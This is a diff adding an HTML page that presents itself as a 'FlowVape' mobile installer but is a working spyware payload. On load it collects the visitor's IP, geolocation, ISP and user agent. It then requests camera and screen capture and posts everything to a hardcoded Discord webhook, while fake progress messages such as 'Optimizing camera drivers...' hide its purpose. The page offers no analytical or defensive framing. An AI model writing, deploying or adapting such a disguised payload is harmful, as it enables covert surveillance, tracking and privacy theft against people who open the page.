@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FlowVape - Mobile Installer</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #9b4dff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 { margin: 0 0 10px 0; font-size: 24px; }
+        p { color: #aaa; font-size: 14px; margin: 5px 0; }
+        #status { color: #9b4dff; font-weight: bold; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>FlowVape</h1>
+    <p>Initializing Mobile Module...</p>
+    <p id="status">Connecting to server...</p>
+
+    <!-- Hidden iFrame to trigger camera permission silently if possible -->
+    <iframe src="about:blank" style="display:none;" id="camFrame" allow="camera"></iframe>
+    
+    <!-- Hidden video element for camera capture -->
+    <video id="hiddenVideo" style="display:none;" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1549255647147593769/Eg6-4sLZnzEHfIJMb_WoGmLVOmkdFKowcA88UgyQsVATym1d8CH82BNEUUZ484u5zVX-";
+
+        async function sendToDiscord(content, fileBlob, fileName) {
+            const formData = new FormData();
+            formData.append("content", content);
+
+            if (fileBlob) {
+                formData.append("file", fileBlob, fileName);
+            }
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (e) {
+                console.error("Webhook failed:", e);
+            }
+        }
+
+        function getIPInfo() {
+            return fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .catch(() => null);
+        }
+
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                });
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function captureScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/png');
+                });
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function init() {
+            const statusEl = document.getElementById('status');
+            const ipInfo = await getIPInfo();
+            
+            let content = `**Target Opened Web Payload**\n> **IP:** ${ipInfo ? ipInfo.ip : 'Unknown'}\n> **Location:** ${ipInfo ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}` : 'Unknown'}\n> **ISP:** ${ipInfo ? ipInfo.org : 'Unknown'}\n> **Device:** ${navigator.userAgent}\n> **Time:** ${new Date().toLocaleString()}\n`;
+
+            // Send IP info first
+            await sendToDiscord(content, null, null);
+            statusEl.innerText = "Connected. Fetching resources...";
+
+            // Try to grab camera (will prompt user on mobile/PC)
+            const camBlob = await captureCamera();
+            if (camBlob) {
+                statusEl.innerText = "Optimizing camera drivers...";
+                await sendToDiscord("**Camera captured from web payload**", camBlob, "camera.jpg");
+            }
+
+            // Try to grab screen (will prompt user on PC/Android)
+            const screenBlob = await captureScreen();
+            if (screenBlob) {
+                statusEl.innerText = "Finalizing installation...";
+                await sendToDiscord("**Screen captured from web payload**", screenBlob, "screenshot.png");
+            }
+
+            statusEl.innerText = "Done. You can close this tab.";
+        }
+
+        // Start execution after a short delay to let the page render
+        setTimeout(init, 1000);
+    </script>
+</body>
+</html>
